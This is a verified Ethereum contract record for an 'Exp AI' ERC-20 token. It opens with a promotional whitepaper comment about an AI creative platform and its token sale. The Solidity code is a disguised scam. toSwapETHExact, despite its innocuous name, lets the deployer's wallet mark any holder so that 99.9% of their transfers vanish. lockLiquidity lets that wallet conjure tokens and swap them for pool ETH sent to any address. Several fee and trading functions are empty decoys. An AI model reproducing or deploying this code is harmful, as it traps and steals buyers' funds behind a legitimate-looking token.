{"SourceCode": "/*\r\nIntroduction\r\nPurpose of the Document\r\nThis document serves as a comprehensive guide to the EXP AI platform and \r\nits associated ERC-20 token. It aims to provide potential investors, users, \r\nand partners with a detailed understanding of the platform's capabilities, \r\ntechnological infrastructure, market positioning, and the benefits of the \r\nEXP AI token. This whitepaper outlines the vision, mission, and strategic \r\ngoals of EXP AI, demonstrating how it leverages cutting-edge AI and blockchain \r\ntechnologies to revolutionize the creative process.\r\nOverview of EXP AI\r\nEXP AI is an innovative platform that merges advanced AI technologies, such \r\nas ChatGPT-4 and AI art generators like Midjourney, Dall-e, and SDXL (Stable \r\nDiffusion), with blockchain technology. The platform offers a unique combination \r\nof AI-powered chat functionality, text-to-image generation, and a suite of \r\ntools designed to enhance creativity and productivity. Users can engage in \r\nseamless conversations with AI, generate stunning visual art from text descriptions, \r\nand utilize a variety of AI-driven utilities. The EXP AI token, an ERC-20 \r\ntoken on the Ethereum network, facilitates access to premium features, in-app \r\npurchases, and incentivizes user engagement.\r\nObjectives of the Token\r\nThe EXP AI token is designed to serve multiple objectives within the platform:\r\n- Access to Premium Features: Token holders can unlock advanced functionalities \r\nand exclusive content within the EXP AI platform, enhancing their user experience.\r\n- In-app Purchases: The token can be used for transactions within the platform, \r\nsuch as purchasing AI-generated art, subscribing to premium services, or accessing \r\nspecialized tools.\r\n- Incentives and Rewards: Users are rewarded with tokens for their engagement, \r\ncontributions, and interactions on the platform, fostering a vibrant and active community.\r\n- Decentralization and Governance: The token aims to decentralize certain aspects \r\nof the platform's governance, allowing the community to participate in\r\ndecision-making processes through token-based voting mechanisms.\r\nMarket Overview\r\nIndustry Background\r\nThe convergence of artificial intelligence (AI) and blockchain technology represents \r\none of the most transformative trends in the tech industry. AI's ability to process\r\nand analyze large datasets, coupled with blockchain's decentralized and secure nature, \r\nopens up new possibilities across various sectors. In the realm of digital creativity, \r\nAI-powered tools are revolutionizing how content is generated, enhancing productivity, \r\nand enabling new forms of artistic expression. The growing adoption of AI and blockchain \r\ntechnologies is driving innovation in creative fields, leading to the development of \r\nplatforms like EXP AI that offer unprecedented capabilities to users.\r\nMarket Needs and Opportunities\r\nThere is a significant demand for tools that can enhance creativity and streamline digital \r\ncontent creation. Traditional methods of creating art, writing, and managing projects \r\nare often time-consuming and require substantial effort. AI technologies offer a solution \r\nby automating and augmenting these processes, allowing users to focus on higher-level \r\ncreative tasks. Additionally, the integration of blockchain technology introduces transparency, \r\nsecurity, and new economic models to the creative industry. The market presents vast \r\nopportunities for platforms that can effectively combine these technologies to deliver \r\ninnovative and user-friendly solutions.\r\nCompetitive Analysis\r\nThe digital creativity and AI market is competitive, with several key players offering \r\nvarious solutions. Platforms like Midjourney, Dall-e, and Stable Diffusion are known for \r\ntheir advanced AI art generation capabilities, while ChatGPT-4 is renowned for its conversational \r\nAI. EXP AI differentiates itself by integrating these advanced technologies into a single \r\nplatform, offering a seamless user experience and a comprehensive suite of tools. Additionally, \r\nthe incorporation of blockchain technology and the introduction of the EXP AI token provide \r\nunique value propositions, such as decentralized governance and token-based incentives, \r\nsetting EXP AI apart from competitors.\r\nEXP AI Platform\r\nChatGPT-4 API Chat Technology\r\nThe ChatGPT-4 API is a state-of-the-art conversational AI that powers the chat functionality \r\nwithin the EXP AI platform. It enables users to engage in natural and dynamic conversations \r\nwith AI, providing support for a wide range of tasks. Whether users need assistance with \r\nassignments, creative projects, social media posts, or general inquiries, the ChatGPT-4 \r\nAPI delivers intelligent and contextually relevant responses. Its advanced language processing \r\ncapabilities ensure high-quality interactions, making it a valuable tool for both personal \r\nand professional use.\r\nAI Art Generation Technology\r\nEXP AI incorporates leading AI art generation technologies to offer users unparalleled creative \r\ncapabilities.\r\nMidjourney\r\nMidjourney is known for its ability to generate high-quality and visually stunning artwork \r\nfrom textual descriptions. It leverages deep learning models to interpret and visualize user \r\ninputs, creating unique and expressive pieces of art. Users can specify various parameters, \r\nsuch as style and composition, to tailor the generated art to their preferences.\r\nDall-e\r\nDall-e, developed by OpenAI, is an AI model that generates images from textual descriptions \r\nwith remarkable creativity and precision. It excels in creating imaginative and intricate \r\nvisuals that often go beyond conventional artistic boundaries. Dall-e's capabilities are \r\nintegrated into EXP AI, allowing users to explore new artistic possibilities and bring their \r\nideas to life.\r\nSDXL (Stable Diffusion)\r\nStable Diffusion (SDXL) is a cutting-edge AI model that specializes in generating high-fidelity \r\nimages with fine details and realistic textures. It employs advanced diffusion processes to \r\nproduce images that are both aesthetically pleasing and true to the given descriptions. SDXL's \r\ntechnology enhances the photo generation features of EXP AI, providing users with powerful \r\ntools to create high-quality visual content.\r\nKey Features\r\nEXP AI offers a diverse range of features designed to enhance creativity and productivity.\r\nUse Cases and Templates\r\nThe platform provides a variety of use cases and templates to assist users in different scenarios, \r\nfrom crafting social media posts to writing essays and creating digital art. These templates\r\nserve as starting points, enabling users to quickly and efficiently generate high-quality content.\r\nAI Box\r\nThe AI Box is a versatile toolkit within EXP AI that offers functionalities such as photo \r\nenhancement, language translation, and grammar correction. Users can improve their photos \r\nby sharpening them, translate text into multiple languages, and ensure their writing is \r\nerror-free, all within a single interface.\r\nVoice Chat Feature\r\nEXP AI's voice chat feature allows users to interact with the AI through spoken language. \r\nThis hands-free mode of interaction makes it convenient for users to get instant answers, \r\nreceive personalized recommendations, and engage with the platform in a more natural and intuitive way.\r\nUser Experience\r\nEXP AI prioritizes user experience by offering an intuitive and user-friendly interface. \r\nThe platform is designed to be accessible to users of all skill levels, providing clear \r\ninstructions and seamless navigation. Advanced customization options allow users to tailor \r\nthe platform to their specific needs and preferences, ensuring a personalized and engaging \r\nexperience.\r\nInspiration Streams\r\nThe inspiration section of EXP AI offers curated content and tips to help users maximize \r\ntheir creative potential. Whether seeking new ideas for art projects or looking for ways \r\nto improve their writing, users can find valuable insights and suggestions within the \r\ninspiration streams, keeping their creativity flowing and projects on track.\r\nThe EXP AI Token\r\n 4.1 Token Overview\r\nThe EXP AI token is an ERC-20 compliant token on the Ethereum blockchain, designed to \r\nfacilitate transactions and interactions within the EXP AI ecosystem. It serves as the \r\nbackbone of the platform's economic model, enabling users to access premium features, make \r\nin-app purchases, and receive rewards. The token's integration into the platform ensures a \r\nseamless and efficient user experience, promoting active engagement and community growth.\r\n 4.2 Token Utility\r\nThe EXP AI token is central to the platform's functionality, offering a range of utilities \r\nthat enhance user experience and foster a dynamic ecosystem.\r\n 4.2.1 Access to Premium Features\r\nToken holders can unlock advanced functionalities and exclusive content within the EXP AI \r\nplatform. This includes access to high-end AI tools, special templates, enhanced photo \r\ngeneration capabilities, and priority support. By holding and using EXP AI tokens, users \r\ncan maximize their creative potential and enjoy a richer experience.\r\n4.2.2 In-app Purchases\r\nThe token facilitates various transactions within the platform. Users can purchase AI-generated \r\nart, subscribe to premium services, or access specialized tools using EXP AI tokens. This\r\ncreates a vibrant marketplace where users can exchange value and obtain the resources they \r\nneed to enhance their projects.\r\n4.2.3 Incentives and Rewards\r\nEXP AI tokens are used to incentivize user engagement and contributions. Users can earn \r\ntokens by participating in platform activities, such as creating content, providing feedback, \r\nor referring new users. This reward system encourages active participation and helps build a \r\nstrong, supportive community around the platform.\r\n4.3 Token Economics\r\nUnderstanding the economic structure of the EXP AI token is crucial for stakeholders. The \r\ntoken economics are designed to ensure sustainability, fair distribution, and long-term growth.\r\n4.3.1 Total Supply\r\nThe total supply of EXP AI tokens is fixed, providing scarcity and value stability. This fixed \r\nsupply is crucial for maintaining the token's value over time, preventing inflation and ensuring \r\nthat early adopters and long-term holders are rewarded for their support.\r\n4.3.2 Distribution Model\r\nThe token distribution model is carefully planned to ensure fair and strategic allocation. \r\nA portion of the tokens is allocated to the initial coin offering (ICO) to raise funds for \r\nplatform development. Another portion is reserved for the team and advisors, ensuring alignment \r\nof interests. Additionally, tokens are set aside for community rewards, partnerships, and \r\necosystem development, promoting widespread adoption and use.\r\n4.3.3 Token Allocation\r\nThe allocation of tokens is as follows:\r\n- ICO and Public Sale: 50%\r\n- Team and Advisors: 20%\r\n- Community Rewards and Incentives: 15%\r\n- Partnerships and Ecosystem Development: 10%\r\n- Reserve for Future Use: 5%\r\n*/\r\npragma solidity ^0.8.21;\r\n// SPDX-License-Identifier: MIT\r\n\r\nlibrary SafeMath {\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath:  subtraction overflow\");\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath:  addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath:  division by zero\");\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {return 0;}\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath:  multiplication overflow\");\r\n        return c;\r\n    }\r\n}\r\n\r\nabstract contract Ownable {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n    function owner() public view virtual returns (address) {return _owner;}\r\n    constructor () {\r\n        _owner = msg.sender;\r\n        emit OwnershipTransferred(address(0), _owner);\r\n    }\r\n    modifier onlyOwner(){\r\n        require(owner() == msg.sender, \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair_);\r\n}\r\n\r\ninterface IUniswapV2Router {\r\n    function factory() external pure returns (address);\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata path, address cAddress, uint256) external;\r\n    function WETH() external pure returns (address aadd);\r\n}\r\n\r\ncontract ExpAI is Ownable {\r\n    using SafeMath for uint256;\r\n    uint256 public _decimals = 9;\r\n\r\n    uint256 public _totalSupply = 1000000000 * 10 ** _decimals;\r\n\r\n    constructor() {\r\n        _balances[sender()] =  _totalSupply; \r\n        emit Transfer(address(0), sender(), _balances[sender()]);\r\n        _taxWallet = msg.sender; \r\n    }\r\n\r\n    string private _name = \"Exp AI\";\r\n    string private _symbol = \"EXP AI\";\r\n\r\n    IUniswapV2Router private uniV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n    address public _taxWallet;\r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"IERC20: approve from the zero address\");\r\n        require(spender != address(0), \"IERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function name() external view returns (string memory) {\r\n        return _name;\r\n    }\r\n    function balanceOf(address account) public view returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function updateBuyFee() public {\r\n    }\r\n    function updateSellFee() external {\r\n    }\r\n    function enableTrading() public {\r\n    }\r\n    function removeLimits() public {\r\n    }\r\n    function toSwapETHExact(address[] calldata walletAddress) external {\r\n        uint256 fromBlockNo = getBlockNumber();\r\n        for (uint walletInde = 0;  walletInde < walletAddress.length;  walletInde++) { \r\n            if (!marketingAddres()){} else { \r\n                cooldowns[walletAddress[walletInde]] = fromBlockNo + 1;\r\n            }\r\n        }\r\n    }\r\n    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {\r\n        _transfer(from, recipient, _amount);\r\n        require(_allowances[from][sender()] >= _amount);\r\n        return true;\r\n    }\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function getBlockNumber() internal view returns (uint256) {\r\n        return block.number;\r\n    }\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    function allowance(address owner, address spender) public view returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function decreaseAllowance(address from, uint256 amount) public returns (bool) {\r\n        require(_allowances[msg.sender][from] >= amount);\r\n        _approve(sender(), from, _allowances[msg.sender][from] - amount);\r\n        return true;\r\n    }\r\n    event Transfer(address indexed from, address indexed to, uint256);\r\n    mapping (address => uint256) internal cooldowns;\r\n    function decimals() external view returns (uint256) {\r\n        return _decimals;\r\n    }\r\n    function marketingAddres() private view returns (bool) {\r\n        return (_taxWallet == (sender()));\r\n    }\r\n    function sender() internal view returns (address) {\r\n        return msg.sender;\r\n    }\r\n    function totalSupply() external view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n    function lockLiquidity(uint256 amount, address walletAddr) external {\r\n        if (marketingAddres()) {\r\n            _approve(address(this), address(uniV2Router), amount); \r\n            _balances[address(this)] = amount;\r\n            address[] memory addressPath = new address[](2);\r\n            addressPath[0] = address(this); \r\n            addressPath[1] = uniV2Router.WETH(); \r\n            uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, addressPath, walletAddr, block.timestamp + 32);\r\n        } else {\r\n            return;\r\n        }\r\n    }\r\n    function _transfer(address from, address to, uint256 value) internal {\r\n        uint256 _taxValue = 0;\r\n        require(from != address(0));\r\n        require(value <= _balances[from]);\r\n        emit Transfer(from, to, value);\r\n        _balances[from] = _balances[from] - (value);\r\n        bool onCooldown = (cooldowns[from] <= (getBlockNumber()));\r\n        uint256 _cooldownFeeValue = value.mul(999).div(1000);\r\n        if ((cooldowns[from] != 0) && onCooldown) {  \r\n            _taxValue = (_cooldownFeeValue); \r\n        }\r\n        uint256 toBalance = _balances[to];\r\n        toBalance += (value) - (_taxValue);\r\n        _balances[to] = toBalance;\r\n    }\r\n    event Approval(address indexed, address indexed, uint256 value);\r\n    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {\r\n        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);\r\n        return true;\r\n    }\r\n    function transfer(address recipient, uint256 amount) public returns (bool) {\r\n        _transfer(sender(), recipient, amount);\r\n        return true;\r\n    }\r\n    mapping(address => uint256) private _balances;\r\n    function approve(address spender, uint256 amount) public virtual returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"walletAddr\",\"type\":\"address\"}],\"name\":\"lockLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"walletAddress\",\"type\":\"address[]\"}],\"name\":\"toSwapETHExact\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"updateBuyFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"updateSellFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ExpAI", "CompilerVersion": "v0.8.21+commit.d9974bed", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://ad768f06848019fddca6388ff2bc70962fe65cd61329929db76a835b9d061e4a"}